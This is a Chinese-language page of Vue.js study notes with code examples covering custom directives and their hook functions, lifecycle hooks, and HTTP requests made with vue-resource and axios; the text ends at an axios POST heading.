<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;p&gt;页面载入时，input 元素自动获取焦点：&lt;/p&gt;</span><br><span class="line">	&lt;input v-focus&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 注册一个全局自定义指令 v-focus</span><br><span class="line">Vue.directive(&apos;focus&apos;, &#123;</span><br><span class="line">  // 当绑定元素插入到 DOM 中。</span><br><span class="line">  inserted: function (el) &#123;</span><br><span class="line">    // 聚焦元素</span><br><span class="line">    el.focus()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>局部</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;p&gt;页面载入时，input 元素自动获取焦点：&lt;/p&gt;</span><br><span class="line">  &lt;input v-focus&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  directives: &#123;</span><br><span class="line">    // 注册一个局部的自定义指令 v-focus</span><br><span class="line">    focus: &#123;</span><br><span class="line">      // 指令的定义</span><br><span class="line">      inserted: function (el) &#123;</span><br><span class="line">        // 聚焦元素</span><br><span class="line">        el.focus()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h1><h2 id="钩子函数（可选）"><a href="#钩子函数（可选）" class="headerlink" title="钩子函数（可选）"></a>钩子函数（可选）</h2><ul>
<li><code>bind</code>: 只调用一次，指令第一次绑定到元素时调用，用这个钩子函数可以定义一个在绑定时执行一次的初始化动作。(和样式相关)</li>
<li><code>inserted</code>: 被绑定元素插入父节点时调用（父节点存在即可调用，不必存在于 document 中）、（和js相关）</li>
<li><code>update</code>: 被绑定元素所在的模板更新时调用，而不论绑定值是否变化。通过比较更新前后的绑定值，可以忽略不必要的模板更新（详细的钩子函数参数见下）。</li>
<li><code>componentUpdated</code>: 被绑定元素所在模板完成一次更新周期时调用。</li>
<li><code>unbind</code>: 只调用一次， 指令与元素解绑时调用。</li>
</ul>
<h2 id="钩子函数参数"><a href="#钩子函数参数" class="headerlink" title="钩子函数参数"></a>钩子函数参数</h2><ul>
<li><strong>el</strong>: 指令所绑定的元素，可以用来直接操作 DOM 。</li>
<li>binding: 一个对象，包含以下属性：<ul>
<li><strong>name</strong>: 指令名，不包括 <code>v-</code> 前缀。</li>
<li><strong>value</strong>: 指令的绑定值， 例如： <code>v-my-directive=&quot;1 + 1&quot;</code>, value 的值是 <code>2</code>。</li>
<li><strong>oldValue</strong>: 指令绑定的前一个值，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用。无论值是否改变都可用。</li>
<li><strong>expression</strong>: 绑定值的表达式或变量名。 例如 <code>v-my-directive=&quot;1 + 1&quot;</code> ， expression 的值是 <code>&quot;1 + 1&quot;</code>。</li>
<li><strong>arg</strong>: 传给指令的参数。例如 <code>v-my-directive:foo</code>， arg 的值是 <code>&quot;foo&quot;</code>。</li>
<li><strong>modifiers</strong>: 一个包含修饰符的对象。 例如： <code>v-my-directive.foo.bar</code>, 修饰符对象 modifiers 的值是 <code>{ foo: true, bar: true }</code>。</li>
</ul>
</li>
<li><strong>vnode</strong>: Vue 编译生成的虚拟节点。</li>
<li><strong>oldVnode</strong>: 上一个虚拟节点，仅在 <code>update</code> 和 <code>componentUpdated</code> 钩子中可用。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;  v-runoob:hello.a.b=&quot;message&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">Vue.directive(&apos;runoob&apos;, &#123;</span><br><span class="line">  bind: function (el, binding, vnode) &#123;</span><br><span class="line">    var s = JSON.stringify</span><br><span class="line">    el.innerHTML =</span><br><span class="line">      &apos;name: &apos;       + s(binding.name) + &apos;&lt;br&gt;&apos; +</span><br><span class="line">      &apos;value: &apos;      + s(binding.value) + &apos;&lt;br&gt;&apos; +</span><br><span class="line">      &apos;expression: &apos; + s(binding.expression) + &apos;&lt;br&gt;&apos; +</span><br><span class="line">      &apos;argument: &apos;   + s(binding.arg) + &apos;&lt;br&gt;&apos; +</span><br><span class="line">      &apos;modifiers: &apos;  + s(binding.modifiers) + &apos;&lt;br&gt;&apos; +</span><br><span class="line">      &apos;vnode keys: &apos; + Object.keys(vnode).join(&apos;, &apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    message: &apos;菜鸟教程!&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h2><p>  等同于写到bind和update函数中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div v-runoob=&quot;&#123; color: &apos;green&apos;, text: &apos;菜鸟教程!&apos; &#125;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">Vue.directive(&apos;runoob&apos;, function (el, binding) &#123;</span><br><span class="line">	// 简写方式设置文本及背景颜色</span><br><span class="line">	el.innerHTML = binding.value.text</span><br><span class="line">	el.style.backgroundColor = binding.value.color</span><br><span class="line">&#125;)</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p>  <img src="C:%5CUsers%5CAdministrator%5CDesktop%5Cvue%5Cvue.png" alt="vue"></p>
<ul>
<li><p>beforeCreate（创建前）</p>
</li>
<li><p>created（创建后）</p>
</li>
<li><p>beforeMount(载入前)</p>
</li>
<li><p>mounted（载入后）</p>
</li>
<li><p>beforeUpdate（更新前）</p>
</li>
<li><p>updated（更新后）</p>
</li>
<li><p>beforeDestroy（销毁前）</p>
</li>
<li><p>destroyed（销毁后）</p>
<p>Demo：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=app&gt;&#123;&#123;a&#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">var myVue = new Vue(&#123;          </span><br><span class="line"> </span><br><span class="line">el: &quot;#app&quot;,          </span><br><span class="line"> </span><br><span class="line">data: &#123;</span><br><span class="line"> </span><br><span class="line">a: &quot;Vue.js&quot;        </span><br><span class="line"> </span><br><span class="line">&#125;,</span><br><span class="line"> </span><br><span class="line"> beforeCreate: function() &#123; </span><br><span class="line"> </span><br><span class="line">          console.log(&quot;创建前&quot;)            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,         </span><br><span class="line"> </span><br><span class="line"> created: function() &#123;</span><br><span class="line"> </span><br><span class="line">                console.log(&quot;创建之后&quot;);            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,         </span><br><span class="line"> </span><br><span class="line"> beforeMount: function() &#123;            </span><br><span class="line"> </span><br><span class="line">console.log(&quot;mount之前&quot;)            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,          </span><br><span class="line"> </span><br><span class="line">mounted: function() &#123;            </span><br><span class="line"> </span><br><span class="line">console.log(&quot;mount之后&quot;)            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,          </span><br><span class="line"> </span><br><span class="line">beforeUpdate: function() &#123;            </span><br><span class="line"> </span><br><span class="line">console.log(&quot;更新前&quot;);            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,          </span><br><span class="line"> </span><br><span class="line">updated: function() &#123;            </span><br><span class="line"> </span><br><span class="line">console.log(&quot;更新完成&quot;);            </span><br><span class="line"> </span><br><span class="line">console.log(this.a);            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,          </span><br><span class="line"> </span><br><span class="line">beforeDestroy: function() &#123;            </span><br><span class="line"> </span><br><span class="line">console.log(&quot;销毁前&quot;);            </span><br><span class="line"> </span><br><span class="line">console.log(this.a)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)            </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;,          </span><br><span class="line"> </span><br><span class="line">destroyed: function() &#123;           </span><br><span class="line"> </span><br><span class="line">console.log(&quot;已销毁&quot;);          </span><br><span class="line"> </span><br><span class="line">console.log(this.a)          </span><br><span class="line"> </span><br><span class="line">console.log(this.$el)          </span><br><span class="line"> </span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line">  &#125;);  </span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Vue-resource（发送数据请求）"><a href="#Vue-resource（发送数据请求）" class="headerlink" title="Vue-resource（发送数据请求）"></a>Vue-resource（发送数据请求）</h1><p>导包：<code>&lt;script src=&quot;https://cdn.staticfile.org/vue-resource/1.5.1/vue-resource.min.js&quot;&gt;&lt;/script&gt;</code></p>
<p>全局设置根域名：<code>Vue.http.options.root=&#39;url&#39;;</code></p>
<p>全局设置emulateJSON:<code>Vue.http.options.emulateJSON = true</code></p>
<h2 id="语法-amp-API"><a href="#语法-amp-API" class="headerlink" title="语法 &amp; API"></a>语法 &amp; API</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 基于全局Vue对象使用http</span><br><span class="line">Vue.http.get(&apos;/someUrl&apos;, [options]).then(successCallback, errorCallback);</span><br><span class="line">Vue.http.post(&apos;/someUrl&apos;, [body], [options]).then(successCallback, errorCallback);</span><br><span class="line"></span><br><span class="line">// 在一个Vue实例内使用$http</span><br><span class="line">this.$http.get(&apos;/someUrl&apos;, [options]).then(successCallback, errorCallback);</span><br><span class="line">this.$http.post(&apos;/someUrl&apos;, [body], [options]).then(successCallback, errorCallback);</span><br></pre></td></tr></table></figure>

<p>7 种请求 API</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; get(url, [options])</span><br><span class="line">&gt; head(url, [options])</span><br><span class="line">&gt; delete(url, [options])</span><br><span class="line">&gt; jsonp(url, [options])</span><br><span class="line">&gt; post(url, [body], [options])</span><br><span class="line">&gt; put(url, [body], [options])</span><br><span class="line">&gt; patch(url, [body], [options])</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>options 参数说明:</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">url</td>
<td align="left"><code>string</code></td>
<td align="center">请求的目标URL</td>
</tr>
<tr>
<td align="left">body</td>
<td align="left"><code>Object</code>, <code>FormData</code>, <code>string</code></td>
<td align="center">作为请求体发送的数据</td>
</tr>
<tr>
<td align="left">headers</td>
<td align="left"><code>Object</code></td>
<td align="center">作为请求头部发送的头部对象</td>
</tr>
<tr>
<td align="left">params</td>
<td align="left"><code>Object</code></td>
<td align="center">作为URL参数的参数对象</td>
</tr>
<tr>
<td align="left">method</td>
<td align="left"><code>string</code></td>
<td align="center">HTTP方法 (例如GET，POST，…)</td>
</tr>
<tr>
<td align="left">timeout</td>
<td align="left"><code>number</code></td>
<td align="center">请求超时（单位：毫秒） (<code>0</code>表示永不超时)</td>
</tr>
<tr>
<td align="left">before</td>
<td align="left"><code>function(request)</code></td>
<td align="center">在请求发送之前修改请求的回调函数</td>
</tr>
<tr>
<td align="left">progress</td>
<td align="left"><code>function(event)</code></td>
<td align="center">用于处理上传进度的回调函数 ProgressEvent</td>
</tr>
<tr>
<td align="left">credentials</td>
<td align="left"><code>boolean</code></td>
<td align="center">是否需要出示用于跨站点请求的凭据</td>
</tr>
<tr>
<td align="left">emulateHTTP</td>
<td align="left"><code>boolean</code></td>
<td align="center">是否需要通过设置<code>X-HTTP-Method-Override</code>头部并且以传统POST方式发送PUT，PATCH和DELETE请求。</td>
</tr>
<tr>
<td align="left">emulateJSON</td>
<td align="left"><code>boolean</code></td>
<td align="center">设置请求体的类型为<code>application/x-www-form-urlencoded</code></td>
</tr>
</tbody></table>
<p>属性和方法</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">类型</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">url</td>
<td align="left"><code>string</code></td>
<td align="center">响应的 URL 源</td>
</tr>
<tr>
<td align="left">body</td>
<td align="left"><code>Object</code>, <code>Blob</code>, <code>string</code></td>
<td align="center">响应体数据</td>
</tr>
<tr>
<td align="left">headers</td>
<td align="left"><code>Header</code></td>
<td align="center">请求头部对象</td>
</tr>
<tr>
<td align="left">ok</td>
<td align="left"><code>boolean</code></td>
<td align="center">当 HTTP 响应码为 200 到 299 之间的数值时该值为 true</td>
</tr>
<tr>
<td align="left">status</td>
<td align="left"><code>number</code></td>
<td align="center">HTTP 响应码</td>
</tr>
<tr>
<td align="left">statusText</td>
<td align="left"><code>string</code></td>
<td align="center">HTTP 响应状态</td>
</tr>
<tr>
<td align="left"><strong>方法</strong></td>
<td align="left"><strong>类型</strong></td>
<td align="center"><strong>描述</strong></td>
</tr>
<tr>
<td align="left">text()</td>
<td align="left"><code>约定值</code></td>
<td align="center">以字符串方式返回响应体</td>
</tr>
<tr>
<td align="left">json()</td>
<td align="left"><code>约定值</code></td>
<td align="center">以格式化后的 json 对象方式返回响应体</td>
</tr>
<tr>
<td align="left">blob()</td>
<td align="left"><code>约定值</code></td>
<td align="center">以二进制 Blob 对象方式返回响应体</td>
</tr>
</tbody></table>
<h2 id="Get-请求"><a href="#Get-请求" class="headerlink" title="Get 请求"></a>Get 请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;box&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; @click=&quot;get()&quot; value=&quot;点我异步获取数据(Get)&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">window.onload = function()&#123;</span><br><span class="line">var vm = new Vue(&#123;</span><br><span class="line">    el:&apos;#box&apos;,</span><br><span class="line">    data:&#123;</span><br><span class="line">        msg:&apos;Hello World!&apos;,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        get:function()&#123;</span><br><span class="line">            //发送get请求</span><br><span class="line">            this.$http.get(&apos;/try/ajax/ajax_info.txt&apos;).then(function(res)&#123;</span><br><span class="line">                document.write(res.body);    </span><br><span class="line">            &#125;,function()&#123;</span><br><span class="line">                console.log(&apos;请求失败处理&apos;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Post请求"><a href="#Post请求" class="headerlink" title="Post请求"></a>Post请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;box&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;button&quot; @click=&quot;post()&quot; value=&quot;点我异步获取数据(Post)&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">window.onload = function()&#123;</span><br><span class="line">	var vm = new Vue(&#123;</span><br><span class="line">	    el:&apos;#box&apos;,</span><br><span class="line">	    data:&#123;</span><br><span class="line">	        msg:&apos;Hello World!&apos;,</span><br><span class="line">	    &#125;,</span><br><span class="line">	    methods:&#123;</span><br><span class="line">	        post:function()&#123;</span><br><span class="line">	            //发送 post 请求</span><br><span class="line">	            this.$http.post(&apos;/try/ajax/demo_test_post.php&apos;,&#123;name:&quot;菜鸟教程&quot;,url:&quot;http://www.runoob.com&quot;&#125;,&#123;emulateJSON:true&#125;).then(function(res)&#123;</span><br><span class="line">                    document.write(res.body);    </span><br><span class="line">                &#125;,function(res)&#123;</span><br><span class="line">                    console.log(res.status);</span><br><span class="line">                &#125;);</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">demo_test_post.php 代码如下：</span><br><span class="line">&lt;?php</span><br><span class="line">$name = isset($_POST[&apos;name&apos;]) ? htmlspecialchars($_POST[&apos;name&apos;]) : &apos;&apos;;</span><br><span class="line">$city = isset($_POST[&apos;url&apos;]) ? htmlspecialchars($_POST[&apos;url&apos;]) : &apos;&apos;;</span><br><span class="line">echo &apos;网站名: &apos; . $name;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo &apos;URL 地址: &apos; .$city;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h1><h2 id="GET-方法"><a href="#GET-方法" class="headerlink" title="GET 方法"></a>GET 方法</h2><p>获取json对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &#123;&#123; info &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      info: null</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    axios</span><br><span class="line">      .get(&apos;https://www.runoob.com/try/ajax/json_demo.json&apos;)</span><br><span class="line">      .then(response =&gt; (this.info = response))</span><br><span class="line">      .catch(function (error) &#123; // 请求失败处理</span><br><span class="line">        console.log(error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用 response.data 读取 JSON 数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;h1&gt;网站列表&lt;/h1&gt;</span><br><span class="line">  &lt;div</span><br><span class="line">    v-for=&quot;site in info&quot;</span><br><span class="line">  &gt;</span><br><span class="line">    &#123;&#123; site.name &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      info: null</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    axios</span><br><span class="line">      .get(&apos;https://www.runoob.com/try/ajax/json_demo.json&apos;)</span><br><span class="line">      .then(response =&gt; (this.info = response.data.sites))</span><br><span class="line">      .catch(function (error) &#123; // 请求失败处理</span><br><span class="line">        console.log(error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>传递参数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 直接在 URL 上添加参数 ID=12345</span><br><span class="line">axios.get(&apos;/user?ID=12345&apos;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">// 也可以通过 params 设置参数：</span><br><span class="line">axios.get(&apos;/user&apos;, &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">      ID: 12345</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="POST-方法"><a href="#POST-方法" class="headerlink" title="POST 方法"></a>POST 方法</h2><p>获取json对象</p>
